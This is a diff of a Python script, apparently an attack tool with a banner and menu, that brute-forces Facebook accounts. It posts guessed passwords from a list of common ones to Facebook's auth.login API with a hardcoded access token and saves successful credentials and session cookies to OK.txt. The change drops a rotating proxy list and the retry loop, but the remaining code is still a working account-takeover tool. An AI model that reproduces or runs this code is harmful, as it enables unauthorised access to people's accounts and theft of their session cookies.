@@ -1,7 +1,7 @@
-import os, random, requests, json, urllib.parse
+import os, json, requests, urllib.parse
+import pycurl
 from io import BytesIO
 from concurrent.futures import ThreadPoolExecutor
-import pycurl
 
 # ─── Banner ─────────────────────────────
 banner = """
@@ -25,12 +25,6 @@ def menu_box():
     print('╚═' + '═' * 45 + '═╝')
 
 ACCESS_TOKEN = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-PROXIES = [
-    '102.132.52.226:8080', '110.238.111.229:8080', '120.25.189.254:8008',
-    '13.208.43.139:3128', '170.85.158.82:10005', '181.174.164.221:80',
-    '47.113.221.120:3127', '47.92.152.43:12000', '54.219.186.252:9909',
-    '8.130.36.163:9080'
-]
 FIXED_PASS = ['123456','123123','111222','12345678','123456789','111111','112233','555555','222222','333333','password']
 
 def fetch_name(uid):
@@ -48,48 +42,45 @@ def build_passwords(uid, name=None):
     return pwds
 
 def try_login(uid, pwd):
-    for attempt in range(3):  # Retry max 3 times with different proxies
-        buffer = BytesIO()
-        curl = pycurl.Curl()
-        curl.setopt(curl.URL, "https://b-api.facebook.com/method/auth.login")
-        curl.setopt(curl.POST, 1)
-        curl.setopt(curl.POSTFIELDS, urllib.parse.urlencode({
-            'email': uid,
-            'password': pwd,
-            'access_token': ACCESS_TOKEN,
-            'format': 'json',
-            'sdk_version': '2',
-            'generate_session_cookies': '1',
-            'locale': 'en_US',
-            'method': 'auth.login'
-        }))
-        curl.setopt(curl.WRITEDATA, buffer)
-        curl.setopt(curl.TIMEOUT, 10)
-        curl.setopt(curl.HTTPHEADER, [
-            'User-Agent: Mozilla/5.0 (Linux; Android 10)',
-            'Content-Type: application/x-www-form-urlencoded'
-        ])
-        proxy = random.choice(PROXIES)
-        curl.setopt(pycurl.PROXY, proxy)
-        curl.setopt(pycurl.PROXYTYPE, pycurl.PROXYTYPE_HTTP)
+    buffer = BytesIO()
+    curl = pycurl.Curl()
+    curl.setopt(curl.URL, "https://b-api.facebook.com/method/auth.login")
+    curl.setopt(curl.POST, 1)
+    curl.setopt(curl.POSTFIELDS, urllib.parse.urlencode({
+        'email': uid,
+        'password': pwd,
+        'access_token': ACCESS_TOKEN,
+        'format': 'json',
+        'sdk_version': '2',
+        'generate_session_cookies': '1',
+        'locale': 'en_US',
+        'method': 'auth.login'
+    }))
+    curl.setopt(curl.WRITEDATA, buffer)
+    curl.setopt(curl.TIMEOUT, 10)
+    curl.setopt(curl.HTTPHEADER, [
+        'User-Agent: Mozilla/5.0 (Linux; Android 10)',
+        'Content-Type: application/x-www-form-urlencoded'
+    ])
 
-        try:
-            curl.perform()
-            result = json.loads(buffer.getvalue().decode())
-            if "session_key" in result:
-                cookie = "; ".join([f"{c['name']}={c['value']}" for c in result["session_cookies"]])
-                print(f"\033[1;92m[OK] {uid} | {pwd} | 🍪 {cookie}\033[0m")
-                open("OK.txt", "a").write(f"{uid}|{pwd}|{cookie}\n")
-                return True
-            elif "checkpoint" in result.get("error_msg", "").lower():
-                print(f"\033[1;93m[CP] {uid} | {pwd}\033[0m")
-                open("CP.txt", "a").write(f"{uid}|{pwd}\n")
-                return True
-        except Exception as e:
-            print(f"\033[1;91m[ERR] {uid} | {pwd} | {str(e).split(':')[0]} | Retrying...\033[0m")
-        finally:
-            curl.close()
-            buffer.close()
+    try:
+        curl.perform()
+        result = json.loads(buffer.getvalue().decode())
+        if "session_key" in result:
+            cookie = "; ".join([f"{c['name']}={c['value']}" for c in result["session_cookies"]])
+            print(f"\033[1;92m[OK] {uid} | {pwd} | 🍪 {cookie}\033[0m")
+            open("OK.txt", "a").write(f"{uid}|{pwd}|{cookie}\n")
+            return True
+        elif "checkpoint" in result.get("error_msg", "").lower():
+            print(f"\033[1;93m[CP] {uid} | {pwd}\033[0m")
+            open("CP.txt", "a").write(f"{uid}|{pwd}\n")
+            return True
+    except Exception as e:
+        print(f"\033[1;91m[ERR] {uid} | {pwd} | {str(e).split(':')[0]}\033[0m")
+    finally:
+        curl.close()
+        buffer.close()
+
     return False
 
 def bruteforce(uid):
